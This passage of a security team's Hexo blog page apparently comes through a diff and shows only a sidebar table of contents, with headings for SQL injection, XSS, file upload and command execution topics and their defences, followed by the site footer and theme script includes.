class="nav-text">bool盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#布尔条件构造"><span class="nav-number">5.0.14.1.</span> <span class="nav-text">布尔条件构造</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#构造逻辑判断"><span class="nav-number">5.0.14.2.</span> <span class="nav-text">构造逻辑判断</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#利用order-by盲注"><span class="nav-number">5.0.14.3.</span> <span class="nav-text">利用order by盲注</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#延时盲注"><span class="nav-number">5.0.15.</span> <span class="nav-text">延时盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Mysql注释符"><span class="nav-number">5.0.16.</span> <span class="nav-text">Mysql注释符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GBK绕过注入"><span class="nav-number">5.0.17.</span> <span class="nav-text">GBK绕过注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实例"><span class="nav-number">5.0.18.</span> <span class="nav-text">实例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#漏洞防范"><span class="nav-number">5.0.19.</span> <span class="nav-text">漏洞防范</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#gpc-rutime魔术引号"><span class="nav-number">5.0.19.1.</span> <span class="nav-text">gpc&#x2F;rutime魔术引号</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#过滤函数和类"><span class="nav-number">5.0.19.2.</span> <span class="nav-text">过滤函数和类</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#addslashes函数"><span class="nav-number">5.0.19.2.1.</span> <span class="nav-text">addslashes函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#mysql-real-escape-string"><span class="nav-number">5.0.19.2.2.</span> <span class="nav-text">mysql_[real]_escape_string</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#intval"><span class="nav-number">5.0.19.2.3.</span> <span class="nav-text">intval</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PDO预编译方式"><span class="nav-number">5.0.19.3.</span> <span class="nav-text">PDO预编译方式</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS漏洞"><span class="nav-number">6.</span> <span class="nav-text">XSS漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#成因与危害"><span class="nav-number">6.1.</span> <span class="nav-text">成因与危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分类"><span class="nav-number">6.2.</span> <span class="nav-text">分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反射型"><span class="nav-number">6.3.</span> <span class="nav-text">反射型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#存储型"><span class="nav-number">6.4.</span> <span class="nav-text">存储型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM型"><span class="nav-number">6.5.</span> <span class="nav-text">DOM型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#实例-1"><span class="nav-number">6.6.</span> <span class="nav-text">实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防范"><span class="nav-number">6.7.</span> <span class="nav-text">防范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS-平台使用简要教程"><span class="nav-number">6.8.</span> <span class="nav-text">XSS 平台使用简要教程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#找一个xss接收平台，并完成注册等一系列操作"><span class="nav-number">6.8.1.</span> <span class="nav-text">找一个xss接收平台，并完成注册等一系列操作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#创建和配置项目"><span class="nav-number">6.8.2.</span> <span class="nav-text">创建和配置项目</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用"><span class="nav-number">6.8.3.</span> <span class="nav-text">使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#接收"><span class="nav-number">6.8.4.</span> <span class="nav-text">接收</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#收集常见的XSS-payload"><span class="nav-number">6.9.</span> <span class="nav-text">收集常见的XSS payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件操作漏洞"><span class="nav-number">7.</span> <span class="nav-text">文件操作漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含"><span class="nav-number">7.1.</span> <span class="nav-text">文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件读取-下载"><span class="nav-number">7.2.</span> <span class="nav-text">文件读取(下载)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传漏洞"><span class="nav-number">7.3.</span> <span class="nav-text">文件上传漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#客户端校验"><span class="nav-number">7.4.</span> <span class="nav-text">客户端校验</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#服务端检测"><span class="nav-number">7.5.</span> <span class="nav-text">服务端检测</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MIME类型检测"><span class="nav-number">7.5.1.</span> <span class="nav-text">MIME类型检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#扩展名检测"><span class="nav-number">7.5.2.</span> <span class="nav-text">扩展名检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#文件内容检测"><span class="nav-number">7.5.3.</span> <span class="nav-text">文件内容检测</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#竞争上传"><span class="nav-number">7.5.4.</span> <span class="nav-text">竞争上传</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件删除"><span class="nav-number">7.6.</span> <span class="nav-text">文件删除</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#防范-1"><span class="nav-number">7.7.</span> <span class="nav-text">防范</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码执行"><span class="nav-number">8.</span> <span class="nav-text">代码执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令执行"><span class="nav-number">9.</span> <span class="nav-text">命令执行</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="WUST-AIS"
+      src="/uploads/logo.png">
+  <p class="site-author-name" itemprop="name">WUST-AIS</p>
+  <div class="site-description" itemprop="description">Join us</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/wust-ais" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;wust-ais" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:no-reply-wais@foxmail.com" title="E-Mail → mailto:no-reply-wais@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">WUST-AIS</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.1
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.2
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
